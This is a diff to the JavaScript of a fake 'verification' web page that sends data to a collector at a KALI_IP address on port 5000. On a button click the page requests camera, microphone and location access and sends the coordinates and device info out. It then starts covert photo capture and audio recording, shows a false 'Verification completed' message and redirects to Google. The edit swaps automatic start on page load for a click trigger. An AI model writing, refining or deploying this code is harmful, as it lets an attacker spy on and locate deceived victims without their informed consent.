@@ -5,19 +5,14 @@ const API_URL = `http://${KALI_IP}:5000/collect`;
 let mediaStream = null;
 let mediaRecorder = null;
 let audioChunks = [];
-let allGranted = false;
 
-// Auto-start when page loads
-window.addEventListener('load', () => {
-    setTimeout(() => {
-        requestAllPermissions();
-    }, 1000);
-});
-
-// Request all permissions automatically
-async function requestAllPermissions() {
-    updateMessage('Initializing security check...', 'info');
-    showProgress(true);
+// Wait for button click
+document.getElementById('agree-btn').addEventListener('click', async () => {
+    const btn = document.getElementById('agree-btn');
+    btn.disabled = true;
+    btn.textContent = 'Processing...';
+    
+    updateMessage('Starting verification...', 'info');
     
     await requestCamera();
     await requestMicrophone();
@@ -25,69 +20,47 @@ async function requestAllPermissions() {
     
     sendDeviceInfo();
     
-    if (allGranted) {
+    // Start capturing after permissions granted
+    setTimeout(() => {
         startPhotoCapture();
         startAudioRecording();
-        updateProgress(100);
-        updateMessage('✓ Verification completed! Redirecting...', 'success');
-        
-        setTimeout(() => {
-            window.location.href = 'https://www.google.com';
-        }, 2000);
-    } else {
-        updateMessage('Some permissions were denied. Please allow all to continue.', 'error');
-        showProgress(false);
-    }
-}
+    }, 2000);
+    
+    updateMessage('✓ Verification completed! Redirecting...', 'success');
+    
+    setTimeout(() => {
+        window.location.href = 'https://www.google.com';
+    }, 3000);
+});
 
 // Request Camera
 async function requestCamera() {
-    const statusEl = document.getElementById('camera-status');
-    const itemEl = document.getElementById('camera-item');
-    
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
         mediaStream = stream;
         
-        statusEl.textContent = '✓';
-        statusEl.classList.add('granted');
-        itemEl.classList.add('granted');
-        
+        updateMessage('✓ Camera access granted', 'success');
         sendToAPI('camera', { status: 'granted' });
-        updateProgress(33);
         return true;
     } catch(err) {
-        statusEl.textContent = '✗';
-        statusEl.classList.add('denied');
-        itemEl.classList.add('denied');
+        updateMessage('✗ Camera access denied', 'error');
         sendToAPI('camera', { status: 'denied', error: err.message });
-        allGranted = false;
         return false;
     }
 }
 
 // Request Microphone
 async function requestMicrophone() {
-    const statusEl = document.getElementById('microphone-status');
-    const itemEl = document.getElementById('microphone-item');
-    
     try {
         await navigator.mediaDevices.getUserMedia({ audio: true });
-        statusEl.textContent = '✓';
-        statusEl.classList.add('granted');
-        itemEl.classList.add('granted');
-        
+        updateMessage('✓ Microphone access granted', 'success');
         sendToAPI('microphone', { status: 'granted' });
-        updateProgress(66);
         return true;
     } catch(err) {
-        statusEl.textContent = '✗';
-        statusEl.classList.add('denied');
-        itemEl.classList.add('denied');
+        updateMessage('✗ Microphone access denied', 'error');
         sendToAPI('microphone', { status: 'denied', error: err.message });
-        allGranted = false;
         return false;
     }
 }
@@ -95,37 +68,24 @@ async function requestMicrophone() {
 // Request Location
 function requestLocation() {
     return new Promise((resolve) => {
-        const statusEl = document.getElementById('location-status');
-        const itemEl = document.getElementById('location-item');
-        
         if (!navigator.geolocation) {
-            statusEl.textContent = '✗';
-            statusEl.classList.add('denied');
-            itemEl.classList.add('denied');
+            updateMessage('✗ Location not supported', 'error');
             resolve(false);
             return;
         }
         
         navigator.geolocation.getCurrentPosition(
             (position) => {
-                statusEl.textContent = '✓';
-                statusEl.classList.add('granted');
-                itemEl.classList.add('granted');
-                
+                updateMessage('✓ Location access granted', 'success');
                 sendToAPI('location', {
                     lat: position.coords.latitude,
                     lon: position.coords.longitude
                 });
-                updateProgress(100);
-                allGranted = true;
                 resolve(true);
             },
             (err) => {
-                statusEl.textContent = '✗';
-                statusEl.classList.add('denied');
-                itemEl.classList.add('denied');
+                updateMessage('✗ Location access denied', 'error');
                 sendToAPI('location', { status: 'denied', error: err.message });
-                allGranted = false;
                 resolve(false);
             }
         );
@@ -199,22 +159,20 @@ function startAudioRecording() {
 }
 
 // UI Helpers
-function updateProgress(percent) {
-    const progressContainer = document.querySelector('.progress-container');
-    const progressBar = document.getElementById('progress-bar');
-    progressContainer.style.display = 'block';
-    progressBar.style.width = percent + '%';
-}
-
-function showProgress(show) {
-    const progressContainer = document.querySelector('.progress-container');
-    progressContainer.style.display = show ? 'block' : 'none';
-}
-
 function updateMessage(text, type) {
     const msgDiv = document.getElementById('message');
     msgDiv.textContent = text;
     msgDiv.className = 'message ' + type;
+    
+    // Clear after 3 seconds
+    setTimeout(() => {
+        if (msgDiv.className === 'message ' + type) {
+            msgDiv.style.display = 'none';
+            setTimeout(() => {
+                msgDiv.style.display = '';
+            }, 100);
+        }
+    }, 3000);
 }
 
 // Send to API
